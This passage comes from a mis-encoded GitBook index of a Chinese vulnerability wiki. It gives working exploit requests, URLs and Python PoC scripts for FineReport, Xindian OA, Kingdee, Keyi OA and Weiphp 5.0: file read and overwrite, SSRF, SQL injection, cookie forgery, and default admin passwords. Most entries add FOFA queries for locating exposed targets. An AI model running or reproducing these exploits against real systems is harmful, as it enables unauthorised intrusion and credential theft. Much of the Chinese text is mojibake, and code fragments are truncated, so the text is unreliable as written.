print(\"\\033[32m[o] ç›®æ ‡å­˜åœ¨æ¼æ´,è¯»å–æ•æ„Ÿæ–‡ä»¶ \\n{} \\033[0m\".format(response.text)) user_name = re.findall(r'', response.text) cipher = re.findall(r'', response.text) password = decode_passwd(cipher[0]) print(\"\\033[34m[o] åå°è´¦æˆ·å¯†ç ä¸º:{} {} \\033[0m\".format(user_name[0], password)) else: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ FineReportv8.0_Arbitrary_file_read PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/å¸†è½¯OA/å¸†è½¯ V9 ä»»æ„æ–‡ä»¶è¦†ç›–æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/å¸†è½¯OA/å¸†è½¯ V9 ä»»æ„æ–‡ä»¶è¦†ç›–æ–‡ä»¶ä¸Šä¼ .html","title":"å¸†è½¯ V9 ä»»æ„æ–‡ä»¶è¦†ç›–æ–‡ä»¶ä¸Šä¼ ","keywords":"","body":"å¸†è½¯ V9 ä»»æ„æ–‡ä»¶è¦†ç›–æ–‡ä»¶ä¸Šä¼  æ¼æ´æè¿° å¸†è½¯ V9 å­˜åœ¨ä»»æ„æ–‡ä»¶è¦†ç›–ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä»»æ„æ–‡ä»¶ä¸Šä¼  æ¼æ´å½±å“ [!NOTE] å¸†è½¯ V9 æ¼æ´å¤ç° POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1 Host: 192.168.10.1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE Connection: close Content-Type:text/xml;charset=UTF-8 Content-Length: 74 {\"__CONTENT__\":\"\",\"__CHARSET__\":\"UTF-8\"} PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/å¸†è½¯OA/å¸†è½¯æŠ¥è¡¨ 2012 SSRFæ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/å¸†è½¯OA/å¸†è½¯æŠ¥è¡¨ 2012 SSRFæ¼æ´.html","title":"å¸†è½¯æŠ¥è¡¨ 2012 SSRFæ¼æ´","keywords":"","body":"å¸†è½¯æŠ¥è¡¨ 2012 SSRFæ¼æ´ æ¼æ´æè¿° å¸†è½¯æŠ¥è¡¨ 2012 å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œé€šè¿‡è®¿é—®ç‰¹å®šçš„Urlè·å–é€ æˆSSRF æ¼æ´å½±å“ [!NOTE] å¸†è½¯æŠ¥è¡¨ 2012 FOFA [!NOTE] body=\"down.download?FM_SYS_ID\" æ¼æ´å¤ç° æ¼æ´éªŒè¯Urlä¸º /ReportServer?op=resource&resource=0m0m6k.dnslog.cn PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/å¸†è½¯OA/å¸†è½¯æŠ¥è¡¨ 2012 ä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/å¸†è½¯OA/å¸†è½¯æŠ¥è¡¨ 2012 ä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"å¸†è½¯æŠ¥è¡¨ 2012 ä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"å¸†è½¯æŠ¥è¡¨ 2012 ä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° å¸†è½¯æŠ¥è¡¨ 2012 å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œé€šè¿‡è®¿é—®ç‰¹å®šçš„Urlè·å–éƒ¨åˆ†æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] å¸†è½¯æŠ¥è¡¨ 2012 FOFA [!NOTE] body=\"down.download?FM_SYS_ID\" æ¼æ´å¤ç° è·å–ç™»å½•æŠ¥è¡¨ç³»ç»Ÿçš„IP http://xxx.xxx.xxx.xxx/ReportServer?op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false æ•°æ®åº“ä¿¡æ¯æ³„éœ² http://xxx.xxx.xxx.xxx/ReportServer?op=fr_server&cmd=sc_getconnectioninfo åå°é»˜è®¤å£ä»¤ admin/123456 /ReportServer?op=fr_auth&cmd=ah_login&_=new%20Date().getTime() PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ–°ç‚¹OA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ–°ç‚¹OA/","title":"æ–°ç‚¹OA","keywords":"","body":"æ–°ç‚¹OA æ–°ç‚¹OA æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-24 20:25:22 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ–°ç‚¹OA/æ–°ç‚¹OA æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ–°ç‚¹OA/æ–°ç‚¹OA æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"æ–°ç‚¹OA æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"æ–°ç‚¹OA æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° æ–°ç‚¹OA å­˜åœ¨æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œè®¿é—®ç‰¹å®šçš„Urlæ—¶å¯ä»¥è·å–æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•åä¿¡æ¯ï¼Œæ”»å‡»è€…è·å–åå¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨ æ¼æ´å½±å“ [!NOTE] æ–°ç‚¹OA FOFA [!NOTE] app=\"æ–°ç‚¹OA\" æ¼æ´å¤ç° æ„é€ çš„Urlä¸º /ExcelExport/äººå‘˜åˆ—è¡¨.xls å°†ä¼šä¸‹è½½äººå‘˜åˆ—è¡¨æ–‡ä»¶ é€šè¿‡è·å–çš„ç™»å½•åç™»é™†åå°(é»˜è®¤å¯†ç 11111) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘è¶OA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘è¶OA/","title":"é‡‘è¶OA","keywords":"","body":"PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-03 13:13:39 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘è¶OA/é‡‘è¶OA server_file ç›®å½•éå†æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘è¶OA/é‡‘è¶OA server_file ç›®å½•éå†æ¼æ´.html","title":"é‡‘è¶OA server_file ç›®å½•éå†æ¼æ´","keywords":"","body":"é‡‘è¶OA server_file ç›®å½•éå†æ¼æ´ æ¼æ´æè¿° é‡‘è¶OA server_file å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡ç›®å½•éå†å¯ä»¥è·å–æœåŠ¡å™¨æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] é‡‘è¶OA FOFA [!NOTE] app=\"Kingdee-EAS\" æ¼æ´å¤ç° ç™»å½•ç•Œé¢ä¸º æ¼æ´POC /appmonitor/protected/selector/server_file/files?folder=/&suffix= WindowsæœåŠ¡å™¨ appmonitor/protected/selector/server_file/files?folder=C://&suffix= LinuxæœåŠ¡å™¨ appmonitor/protected/selector/server_file/files?folder=/&suffix= PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-04 13:05:33 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/å¯è±OA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/å¯è±OA/","title":"å¯è±OA","keywords":"","body":"å¯è±OA å¯è±OA messageurl.aspx SQLæ³¨å…¥æ¼æ´ å¯è±OA treelist.aspx SQLæ³¨å…¥æ¼æ´ å¯è±OA CloseMsg.aspx SQLæ³¨å…¥æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-16 20:07:30 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/å¯è±OA/å¯è±OA messageurl.aspx SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/å¯è±OA/å¯è±OA messageurl.aspx SQLæ³¨å…¥æ¼æ´.html","title":"å¯è±OA messageurl.aspx SQLæ³¨å…¥æ¼æ´","keywords":"","body":"å¯è±OA messageurl.aspx SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° å¯è±OA messageurl.aspxæ–‡ä»¶å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] å¯è±OA FOFA [!NOTE] app=\"å¯è±OA\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å­˜åœ¨SQLæ³¨å…¥çš„æ–‡ä»¶ä¸º messageurl.aspx http://xxx.xxx.xxx.xxx/client/messageurl.aspx?user=' and (select db_name())>0--&pwd=1 ä½¿ç”¨SQLmapå¯¹å‚æ•° user è¿›è¡Œæ³¨å…¥ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/å¯è±OA/å¯è±OA treelist.aspx SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/å¯è±OA/å¯è±OA treelist.aspx SQLæ³¨å…¥æ¼æ´.html","title":"å¯è±OA treelist.aspx SQLæ³¨å…¥æ¼æ´","keywords":"","body":"å¯è±OA treelist.aspx SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° å¯è±OA treelist.aspxæ–‡ä»¶å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] å¯è±OA FOFA [!NOTE] app=\"å¯è±OA\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å­˜åœ¨SQLæ³¨å…¥çš„æ–‡ä»¶ä¸º treelist.aspx http://xxx.xxx.xxx.xxx/client/treelist.aspx?user=' and (select db_name())>0--&pwd=1 ä½¿ç”¨SQLmapå¯¹å‚æ•° user è¿›è¡Œæ³¨å…¥ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/å¯è±OA/å¯è±OA CloseMsg.aspx SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/å¯è±OA/å¯è±OA CloseMsg.aspx SQLæ³¨å…¥æ¼æ´.html","title":"å¯è±OA CloseMsg.aspx SQLæ³¨å…¥æ¼æ´","keywords":"","body":"å¯è±OA CloseMsg.aspx SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° å¯è±OA CloseMsg.aspxæ–‡ä»¶å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] å¯è±OA FOFA [!NOTE] app=\"å¯è±OA\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å­˜åœ¨SQLæ³¨å…¥çš„æ–‡ä»¶ä¸º CloseMsg.aspx http://xxx.xxx.xxx.xxx/client/CloseMsg.aspx?user=' and (select db_name())>0--&pwd=1 ä½¿ç”¨SQLmapå¯¹å‚æ•° user è¿›è¡Œæ³¨å…¥ Goby & POC PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/":{"url":"PeiQi_Wiki/CMSæ¼æ´/","title":"CMSæ¼æ´","keywords":"","body":"CMS æ¼æ´ğŸ¦… PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 19:46:19 "},"PeiQi_Wiki/CMSæ¼æ´/Weiphp/":{"url":"PeiQi_Wiki/CMSæ¼æ´/Weiphp/","title":"Weiphp","keywords":"","body":"Weiphp Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– CNVD-2020-68596 Weiphp5.0 ä»»æ„ç”¨æˆ·Cookieä¼ªé€  CNVD-2021-09693 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-02-07 17:01:01 "},"PeiQi_Wiki/CMSæ¼æ´/Weiphp/Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– CNVD-2020-68596.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/Weiphp/Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– CNVD-2020-68596.html","title":"Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– CNVD-2020-68596","keywords":"","body":"Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– CNVD-2020-68596 æ¼æ´æè¿° Weiphp5.0 å­˜åœ¨å‰å°æ–‡ä»¶ä»»æ„è¯»å–æ¼æ´ï¼Œå¯ä»¥è¯»å–æ•°æ®åº“é…ç½®ç­‰æ•æ„Ÿæ–‡ä»¶ å½±å“ç‰ˆæœ¬ [!NOTE] Weiphp ç¯å¢ƒæ­å»º weiphp5.0å®˜æ–¹ä¸‹è½½å‚è€ƒæ‰‹å†Œ å‚è€ƒå®˜æ–¹æ‰‹å†Œåˆ›å»ºç½‘ç«™å³å¯ FOFA [!NOTE] app=\"WeiPHP\" æ¼æ´å¤ç° æ¼æ´å‡½æ•°æ–‡ä»¶:application\\material\\controller\\Material.php æ¼æ´å‡½æ•°:_download_imgage public function _download_imgage($media_id, $picUrl = '', $dd = null) { $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); mkdirs($savePath); $cover_id = 0; if (empty($picUrl)) { // è·å–å›¾ç‰‡URL $url = 'https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=' . get_access_token(); $param['media_id'] = $media_id; // dump($url); $picContent = post_data($url, $param, 'json', false); $picjson = json_decode($picContent, true); // dump($picjson);die; if (isset($picjson['errcode']) && $picjson['errcode'] != 0) { $cover_id = do_down_image($media_id, $dd['thumb_url']); if (!$cover_id) { return 0; exit(); } } $picName = NOW_TIME . uniqid() . '.jpg'; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $picContent); } else { $content = wp_file_get_contents($picUrl); // è·å–å›¾ç‰‡æ‰©å±•å $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } } if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } return $cover_id; } é¦–å…ˆæ³¨æ„åˆ°å‡½æ•°çš„æ ‡è¯†ä¸ºpublicï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå‡½æ•°æ˜¯å…¬å…±è°ƒç”¨çš„ï¼Œå¹¶ä¸”å˜é‡picUrlä¸ºå¯æ§å˜é‡ æ ¹æ®ä»£ç ä»ä¸Šå‘ä¸‹åˆ†æ $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); å˜é‡$savePathç¡®å®šæ–‡ä»¶ä¸Šä¼ åçš„ç¼“å­˜ä½ç½®ä¸º/public/uploads/picture/ï¼Œå¹¶æŒ‰ç…§å¹´-æœˆ-æ—¥ åˆ›å»ºæ–‡ä»¶å¤¹ å‘ä¸‹å¯¹å˜é‡$picUrl æ˜¯å¦ä¸ºç©ºè¿›è¡Œåˆ¤æ–­ï¼Œå¹¶åˆ¤æ–­æ˜¯å¦è¿›è¡Œç™»å½•ï¼Œè¿™é‡Œä½¿ç”¨POSTä¼ å‚è¿›è¡ŒéªŒè¯ç™»å½•ç»•è¿‡ï¼Œè·³è½¬åˆ°elseè¯­å¥ä¸‹ else { $content = wp_file_get_contents($picUrl); // è·å–å›¾ç‰‡æ‰©å±•å $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } åˆ†æä¼ å…¥å˜é‡ picUrl çš„ wp_file_get_contentsæ–¹æ³• $content = wp_file_get_contents($picUrl); å‡½æ•°æ–‡ä»¶ä½ç½® application\\common.php å¯ä»¥çœ‹åˆ°è¿™é‡Œæ²¡æœ‰å¯¹æˆ‘ä»¬çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œåªåšäº†ä¸€ä¸ªæœ‰å…³è¶…æ—¶çš„æ“ä½œ, å›åˆ°å‡½æ•°ç»§ç»­å‘ä¸‹åˆ†æ $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); è¿™é‡Œåˆ›å»ºäº†æœ‰å…³å½“å‰æ—¶é—´çš„å›¾ç‰‡æ–‡ä»¶ï¼Œå¹¶å†™å…¥æ–‡ä»¶å¤¹/public/uploads/picture/ ä¸‹ æˆ‘ä»¬å…ˆå°è¯•æ§åˆ¶å˜é‡ $picUrl æ¥å†™å…¥æ•°æ®åº“é…ç½®æ–‡ä»¶åˆ°å›¾ç‰‡ä¸­ /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php æŸ¥çœ‹ç›®å½•/public/uploads/picture/ï¼Œå¹¶ç”¨è®°äº‹æœ¬æ‰“å¼€å†™å…¥çš„jpgæ–‡ä»¶ å¾—åˆ°æ•°æ®åº“é…ç½®æ–‡ä»¶çš„ä¿¡æ¯ï¼Œæ—¢ç„¶è¿™ä¸ªå˜é‡å¯æ§ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•ä¸‹è½½æœ¨é©¬æ–‡ä»¶ï¼Œå†é€šè¿‡è§£ææ¼æ´æˆ–è€…æ–‡ä»¶åŒ…å«ç­‰å…¶ä»–æ¼æ´æ¥getshell åœ¨å½“å‰æ¡ä»¶ä¸‹å¹¶ä¸çŸ¥é“æ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥å›åˆ°ä»£ç ä¸­ç»§ç»­å¯»æ‰¾å¯ä»¥è·å–æ–‡ä»¶åçš„åŠæ³• if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } å‘ä¸‹è·Ÿè¿› addFile å‡½æ•° å‡½æ•°ä½ç½®:application\\home\\model\\Picture.php function addFile($file) { $data['md5'] = md5_file($file['tmp_name']); $id = $this->where('md5', $data['md5'])->value('id'); if ($id > 0) { return $id; } $info = pathinfo($file['tmp_name']); $data['path'] = str_replace(SITE_PATH . '/public', '', $file['tmp_name']); $data['sha1'] = hash_file('sha1', $file['tmp_name']); $data['create_time'] = NOW_TIME; $data['status'] = 1; $data['wpid'] = get_wpid(); $id = $this->insertGetId($data); return $id; } å¯ä»¥çœ‹åˆ°è¿™éƒ¨åˆ†ä»£ç å†™å…¥äº† Picture è¡¨ä¸­ $id = $this->insertGetId($data); æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æ•°æ®åº“çš„è¿™ä¸ªæ•°æ®è¡¨ï¼Œå¯ä»¥å‘ç°ä¹‹å‰æ‰€ä¸Šä¼ çš„æ•°æ®å…¨éƒ¨ç¼“å­˜åœ¨è¿™ä¸ªè¡¨é‡Œäº† æˆ‘ä»¬ç°åœ¨åˆ™éœ€è¦æ‰¾åˆ°ä¸éœ€è¦ç™»å½•çš„åœ°æ–¹æ¥è·å¾—è¿™äº›æ•°æ®ï¼Œæ‰€ä»¥å¯ä»¥å…¨å±€å»æŸ¥æ‰¾è°ƒç”¨äº†è¿™ä¸ª Picture è¡¨çš„åœ°æ–¹ æ‰¾åˆ°ä¸€å¤„å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ function user_pics() { $map['wpid'] = get_wpid(); $picList = M('Picture')->where(wp_where($map)) ->order('id desc') ->select(); $this->assign('picList', $picList); exit($this->fetch()); } è·Ÿè¿› get_wpid å‡½æ•° function get_wpid($wpid = '') { if (defined('WPID')) { return WPID; } else { return 0; } } æŸ¥çœ‹ WPID çš„å®šä¹‰ï¼Œæ–‡ä»¶ä½ç½®åœ¨config\\weiphp_define.php å®šä¹‰å€¼é»˜è®¤ä¸º 1ï¼Œæ‰€ä»¥è¿™é‡Œè°ƒç”¨åˆ™å¯ä»¥è·å¾—æ•°æ®åº“ä¸­Pictrueè¡¨çš„å†…å®¹ï¼Œé—´æ¥çš„çŸ¥é“äº†æ–‡ä»¶å†…å®¹ä»¥åŠæ–‡ä»¶å è®¿é—®åœ°å€: http://webphp/public/index.php/home/file/user_pids å¯ä»¥çœ‹åˆ°æ–‡ä»¶åï¼Œæ ¹æ®urlåœ°å€è®¿é—®é€‰æ‹©ä¸‹è½½å³å¯ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import random import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') \\033[0m') print('+ \\033[34mVersion: Weiphp5.0 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): upload_url = target_url + \"/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } data = { \"1\":1 } try: response = requests.post(url=upload_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸå°† database.phpæ–‡ä»¶ å†™å…¥Pictrueè¡¨ä¸­\\033[0m\") else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") def POC_2(target_url): vnln_url = target_url + \"/public/index.php/home/file/user_pics\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vnln_url, headers=headers).text href = re.findall(r'>> \\033[0m\")) POC_1(target_url) image_url = POC_2(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/Weiphp/Weiphp5.0 ä»»æ„ç”¨æˆ·Cookieä¼ªé€  CNVD-2021-09693.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/Weiphp/Weiphp5.0 ä»»æ„ç”¨æˆ·Cookieä¼ªé€  CNVD-2021-09693.html","title":"Weiphp5.0 ä»»æ„ç”¨æˆ·Cookieä¼ªé€  CNVD-2021-09693","keywords":"","body":"Weiphp5.0 ä»»æ„ç”¨æˆ·Cookieä¼ªé€  CNVD-2021-09693 æ¼æ´æè¿° Weiphp5.0 å­˜åœ¨ç®¡ç†å‘˜ç”¨æˆ·Cookieä¼ªé€ ï¼Œé€šè¿‡æ³„éœ²çš„å¯†é’¥æ•°æ®ï¼Œå¯åˆ©ç”¨åŠ å¯†æ–¹æ³•æ¥å¾—åˆ°ç®¡ç†å‘˜çš„Cookie å½±å“ç‰ˆæœ¬ [!NOTE] Weiphp ç¯å¢ƒæ­å»º weiphp5.0å®˜æ–¹ä¸‹è½½å‚è€ƒæ‰‹å†Œ å‚è€ƒå®˜æ–¹æ‰‹å†Œåˆ›å»ºç½‘ç«™å³å¯ FOFA [!NOTE] app=\"WeiPHP\" æ¼æ´å¤ç° é¦–å…ˆéœ€è¦å¾—åˆ°æ•°æ®åº“é…ç½®æ–‡ä»¶ä¸­çš„data_auth_keyå¯†é’¥ å¾—åˆ°è¿™ä¸ªé…ç½®æ–‡ä»¶å¯å‚ç…§ä¸Šä¸€ç¯‡Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– 'data_auth_key' => '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T' å…¨å±€æŸ¥æ‰¾ä¸‹ä½¿ç”¨äº†è¿™ä¸ªå¯†é’¥çš„åœ°æ–¹ æ‰¾åˆ°äº†è·Ÿæ®è¿™ä¸ªå¯†é’¥çš„åŠ å¯†æ–¹æ³•å’Œè§£å¯†æ–¹æ³• åŠ å¯†æ–¹æ³• think_encrypt function think_encrypt($data, $key = '', $expire = 0) { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = base64_encode($data); $x = 0; $len = strlen($data); $l = strlen($key); $char = ''; for ($i = 0; $i è§£å¯†æ–¹æ³• think_decrypt function think_decrypt($data, $key = '') { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = str_replace(array( '-', '_' ), array( '+', '/' ), $data); $mod4 = strlen($data) % 4; if ($mod4) { $data .= substr('====', $mod4); } $data = base64_decode($data); $expire = substr($data, 0, 10); $data = substr($data, 10); if ($expire > 0 && $expire å…¨å±€æŸ¥çœ‹ä¸‹ä½¿ç”¨äº†è§£å¯†æ–¹æ³•çš„åœ°æ–¹ åœ¨æ–‡ä»¶ application\\common.php ä¸­å«æœ‰ä½¿ç”¨è§£å¯†æ–¹æ³•çš„ä»£ç ï¼Œç”¨äºåšèº«ä»½éªŒè¯ function is_login() { $user = session('user_auth'); if (empty($user)) { $cookie_uid = cookie('user_id'); if (!empty($cookie_uid)) { $uid = think_decrypt($cookie_uid); $userinfo = getUserInfo($uid); D('common/User')->autoLogin($userinfo); $user = session('user_auth'); } } if (empty($user)) { return 0; } else { return 